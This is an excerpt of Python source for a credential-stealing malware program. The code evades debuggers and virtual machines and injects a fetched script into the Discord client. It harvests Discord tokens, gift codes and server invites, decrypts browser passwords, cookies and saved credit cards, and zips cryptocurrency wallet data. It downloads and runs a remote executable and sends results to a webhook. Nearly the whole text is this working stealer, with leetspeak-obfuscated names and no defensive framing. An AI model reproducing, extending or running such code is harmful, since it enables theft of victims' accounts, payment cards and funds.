...
ModuleRequirements = [
    [
        "Crypto.Cipher",
        "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto",
    ]
]
for module in ModuleRequirements:
    try:
        ...
        subprocess.Popen(
            f'"{executable}" -m pip install {module[1]} --quiet', shell=True
        )
        time.sleep(3)
...
def check_windows():
    @ctypes.WINFUNCTYPE(
        ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p)
    )
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode("Windows-1252").lower() in {
            "proxifier",
            "graywolf",
            "extremedumper",
            "zed",
...
def check_dll():
    ...
    if os.path.exists(
        os.path.join(sys_root, "System32\\vmGuestLib.dll")
    ) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program("VM Detected")
...
h00k = "https://webhook.my/post?uniqueid=42f3906b"
...
def G108411NF0():
    try:
        ...
        if contryCode == "not found":
            ...
            globalinfo = (
                f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
            )
        return globalinfo
                                        ...
                                        if "discord_desktop_core" in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == "index.js":
                                                    ...
                                                    injeCTmED0cT0r_cont = requests.get(
                                                        inj3c710n_url
                                                    ).text

                                                    injeCTmED0cT0r_cont = (
                                                        injeCTmED0cT0r_cont.replace(
                                                            "%WEBHOOK%", h00k
                                                        )
                                                    )
...
def G37C0D35(token):
    try:
        ...
        codess = loads(
            urlopen(
                Request(
                    "https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB",
                    headers=headers,
                )
            )
            .read()
        ...
        nitrocodess = loads(
            urlopen(
                Request(
                    "https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB",
                    headers=headers,
                )
            )
            .read()
    ...
    badgeList = [
        {
            ...
            "Value": 4194304,
            "Emoji": "<:active:1045283132796063794> ",
        },
        {
    ...
    for friend in friendlist:
        ...
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend["type"] == 1:
                if (
                    not "House" in badge["Name"]
                    and not badge["Name"] == "Active_Developer"
                ):
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != "":
        ...
        for guild in guilds:
            ...
            if guild["owner"] or guild["permissions"] == "2251799813685247":
                inv = loads(
                    urlopen(
                        Request(
                            f"https://discord.com/api/v6/guilds/{guild['id']}/invites",
                            headers=headers,
                        )
                    )
                    .read()
...
def UP104D70K3N(token, path):
    ...
    pfp = (
        f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
        if pfp != None
        else "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
    )
        ...
        for row in data:
            if row[0] != "":
                for wa in k3YW0rd:
                    ...
                    if wa in row[0]:
                        if not old in p45WW0rDs:
                            p45WW0rDs.append(old)
                P455w.append(
                    f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}"
                )
                P455WC0UNt += 1
...
def G37C00K13(path, arg):
    try:
        ...
        data = SQ17H1N6(
            pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies "
        )
            ...
            if row[0] != "":
                for wa in k3YW0rd:
                    ...
                    if "https" in wa:
                        ...
                        wa = tmp.split("[")[1].split("]")[0]
                    if wa in row[0]:
                        if not old in c00K1W0rDs:
                            c00K1W0rDs.append(old)
                C00K13s.append(
                    f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}"
                )
                C00K1C0UNt += 1
...
def G37CC5(path, arg):
    try:
        ...
        for row in data:
            if row[0] != "":
                CCs.append(
                    f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}"
                )
                CC5C0UNt += 1
...
def download_and_run_file(downloadURL):
    tempFolder = tempfile.gettempdir()
    downloadedFile = os.path.join(tempFolder, "update.exe")
    try:
        ...
        os.system(f"start /b {downloadedFile}")
    except:
        pass


try:
    download_and_run_file("https://webhook.my/dog.jpg")
except:
    pass
...
def G47H3rZ1P5(paths1, paths2, paths3):
    ...
    for walletids in w411375:
        for patt in paths1:
            a = threading.Thread(
                target=Z1P7H1N65, args=[patt[0], patt[5] + str(walletids[0]), patt[1]]
            )
            a.start()
            thttht.append(a)
...
def Z1P7H1N65(path, arg, procc):
    ...
    os.remove(f"{temp}/{name}.zip")
    if (
        "/Local Extension Settings/" in arg
        or "/HougaBouga/" in arg
        or "wallet" in arg.lower()
    ):
...
def G47H3r411():
    ...
    br0W53rP47H5 = [
        ...
        [
            f"{local}/Google/Chrome Beta/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Google/Chrome Dev/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Google/Chrome Unstable/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Google/Chrome Canary/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Yandex/YandexBrowserCanary/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Yandex/YandexBrowserDeveloper/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Yandex/YandexBrowserBeta/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Yandex/YandexBrowserTech/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
        ...
        [
            f"{local}/Yandex/YandexBrowserSxS/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default/",
            "/Default/Network",
    ...
    p47H570Z1P = [
        ...
        [
            f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",
            "Jaxx.exe",
            "Wallet",
        ],
        ...
        for worf in keywords:
            if worf in file.lower():
                if (
                    ...
                    and os.stat(path + "/" + file).st_size < 500000
                    and not ".lnk" in file
                ):
                    fifound.append(
                        [path + "/" + file, UP104D7060F113(path + "/" + file)]
                    )
                    break
...
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = (
    0,
    0,
    0,
    0,
